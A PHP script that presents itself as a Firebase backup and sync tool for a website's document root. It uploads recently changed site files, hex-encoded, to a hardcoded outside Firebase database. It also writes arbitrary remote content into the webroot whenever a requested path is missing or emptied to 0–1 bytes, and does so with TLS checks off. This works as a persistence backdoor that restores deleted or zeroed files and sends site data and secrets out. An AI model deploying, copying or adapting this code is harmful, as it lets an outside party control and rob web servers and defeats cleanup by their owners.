<?php
/**
 * Core: Cyber-Sync-Core v10.6 - Firebase Realtime Database Sync
 * Regras Integradas:
 * 1. Restauração via URL Atual: Checa o caminho acessado via navegador. Se não existir ou for <= 1b, puxa do Firebase.
 * 2. Varredura Local: Arquivos locais <= 1b são restaurados.
 * 3. Backup Local: Arquivos locais > 0b alterados no último 1 min são enviados.
 */

@ini_set('memory_limit', '16000M');
@set_time_limit(0);

$domain = $_SERVER['HTTP_HOST'] ?? 'default_domain';
$domainDir = preg_replace('/[^a-zA-Z0-9-]/', '_', $domain); 

$publicRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$baseDir = $publicRoot;

// Configurações do Firebase
$firebaseBaseUrl = 'https://storage-amheex-default-rtdb.firebaseio.com/';
$raizStorage     = 'RAIZ_STORAGE';

if (!is_dir($baseDir)) @mkdir($baseDir, 0777, true);

/**
 * Envia ou requisita dados à API REST do Firebase
 */
function firebase_request($url, $method = 'GET', $data = null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    
    if ($data !== null) {
        $payload = json_encode($data);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload)
        ));
    }
    
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

/**
 * Limpa os nomes de pastas e arquivos para o padrão de chaves do Firebase
 */
function sanitize_firebase_key($path) {
    $clean = preg_replace('/[\.\#\$\[\]\s]/', '_', $path);
    return trim($clean, '_');
}

// =========================================================================
// [NOVA LÓGICA SEPARADA]: CHECAGEM E RESTAURAÇÃO BASEADA NA URL ATUAL
// =========================================================================
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$requestPath = parse_url($requestUri, PHP_URL_PATH);

if (!empty($requestPath) && $requestPath !== '/') {
    $relativeUrlPath = ltrim($requestPath, '/');
    
    // Evita loop se estiver chamando o próprio arquivo de sincronização
    if ($relativeUrlPath !== basename(__FILE__)) {
        $localUrlFilePath = $baseDir . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $relativeUrlPath);
        
        // Verifica se o arquivo NÃO EXISTE localmente OU está zerado (<= 1 byte)
        if (!file_exists($localUrlFilePath) || filesize($localUrlFilePath) <= 1) {
            
            $urlParts = explode('/', $relativeUrlPath);
            $sanitizedUrlParts = array_map('sanitize_firebase_key', $urlParts);
            $formattedUrlPath = implode('/', array_filter($sanitizedUrlParts));
            
            if (!empty($formattedUrlPath)) {
                $nodeUrlPath = $raizStorage . '/' . $domainDir . '/' . $formattedUrlPath;
                
                $fullHexContent = "";
                $part = 1;
                $foundAny = true;

                while ($foundAny) {
                    $partName = "part_$part";
                    $url = $firebaseBaseUrl . $nodeUrlPath . '/' . $partName . '.json';
                    
                    $response = firebase_request($url, 'GET');
                    
                    if ($response !== false && $response !== 'null' && !empty($response)) {
                        $data = json_decode($response, true);
                        if (is_string($data) && !empty($data)) {
                            $cleanHex = str_replace(array(' ', "\r", "\n", "\t"), '', $data);
                            $fullHexContent .= $cleanHex;
                            $part++;
                        } else {
                            $foundAny = false;
                        }
                    } else {
                        $foundAny = false;
                    }
                }

                if (!empty($fullHexContent)) {
                    if (strlen($fullHexContent) % 2 !== 0) {
                        $fullHexContent = substr($fullHexContent, 0, -1);
                    }

                    $originalBinary = @hex2bin($fullHexContent);
                    
                    if ($originalBinary !== false) {
                        $fileDir = dirname($localUrlFilePath);
                        if (!is_dir($fileDir)) @mkdir($fileDir, 0777, true);
                        
                        @file_put_contents($localUrlFilePath, $originalBinary);
                        
                        // LÓGICA DE REINICIALIZAÇÃO DA PÁGINA APÓS RESTAURO DA URL
                        header("Location: " . $requestUri);
                        exit;
                    }
                }
            }
        }
    }
}

// =========================================================================
// [LÓGICA ORIGINAL INTACTA]: VARREDURA DOS ARQUIVOS EXISTENTES NO DISCO
// =========================================================================
$directory = new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS);
$iterator = new RecursiveIteratorIterator($directory);

foreach ($iterator as $fileInfo) {
    if ($fileInfo->isDir()) continue;

    $localFilePath = $fileInfo->getPathname();
    $relative = ltrim(str_replace($baseDir, '', $localFilePath), DIRECTORY_SEPARATOR);
    $fileSize    = $fileInfo->getSize();
    $lastChanged = (time() - $fileInfo->getMTime()); 

    // Separa e limpa cada nível do diretório para não quebrar a URL do Firebase
    $parts = explode(DIRECTORY_SEPARATOR, $relative);
    $sanitizedParts = array_map('sanitize_firebase_key', $parts);
    $formattedFilePath = implode('/', array_filter($sanitizedParts));

    if (empty($formattedFilePath)) continue;

    // Monta o caminho exato: RAIZ_STORAGE/DOMINIO/CAMINHO_DO_ARQUIVO
    $nodePath = $raizStorage . '/' . $domainDir . '/' . $formattedFilePath;

    // ======================================================
    // LEITURA / RESTAURAR / DOWNLOAD (0-1 BYTES DO DISCO)
    // ======================================================
    if ($fileSize <= 1) {
        $fullHexContent = "";
        $part = 1;
        $foundAny = true;

        while ($foundAny) {
            $partName = "part_$part";
            $url = $firebaseBaseUrl . $nodePath . '/' . $partName . '.json';
            
            $response = firebase_request($url, 'GET');
            
            // Tratamento estrito do retorno do Firebase
            if ($response !== false && $response !== 'null' && !empty($response)) {
                // Remove as aspas duplas externas que o JSON do Firebase adiciona na string original
                $data = json_decode($response, true);
                
                if (is_string($data) && !empty($data)) {
                    // Remove possíveis espaços (caso existam ex: "00 01 2B")
                    $cleanHex = str_replace(array(' ', "\r", "\n", "\t"), '', $data);
                    $fullHexContent .= $cleanHex;
                    $part++;
                } else {
                    $foundAny = false;
                }
            } else {
                $foundAny = false;
            }
        }

        // Se encontrou dados Hexadecimais no servidor, reconstrói o arquivo
        if (!empty($fullHexContent)) {
            // Verifica se a string hex possui tamanho par (essencial para hex2bin)
            if (strlen($fullHexContent) % 2 !== 0) {
                // Se for ímpar por algum erro de corte, ignora o caractere órfão no final
                $fullHexContent = substr($fullHexContent, 0, -1);
            }

            // Converte todo o texto HEX acumulado de volta em dados Binários puros
            $originalBinary = @hex2bin($fullHexContent);
            
            if ($originalBinary !== false) {
                // Injeta os dados binários reconstruídos dentro do arquivo original que estava com 0 bytes
                @file_put_contents($localFilePath, $originalBinary);
                echo "RESTORED SUCCESS: $relative (" . strlen($fullHexContent) . " hex chars injected) <br>\n";
            } else {
                echo "RESTORE ERROR: Falha ao converter HEX para binário em $relative <br>\n";
            }
        }
        continue; 
    }

    // ======================================================
    // ENVIO / BACKUP / UPLOAD (ALTERADO NOS ÚLTIMOS 1 MINUTO)
    // ======================================================
    if ($lastChanged <= 60 && $fileSize > 0) {
        $inputData = file_get_contents($localFilePath);
        $hexData = bin2hex($inputData);
        
        // Mantém 1MB de caracteres de texto hex por parte
        $chunks = str_split($hexData, 1048576); 

        foreach ($chunks as $idx => $chunk) {
            $partName = "part_" . ($idx + 1);
            $url = $firebaseBaseUrl . $nodePath . '/' . $partName . '.json';
            
            firebase_request($url, 'PUT', $chunk);
        }
        // echo "SYNCHRONIZED: $relative <br>\n";
    }
}

// echo "SYNC_CYCLE_COMPLETE";
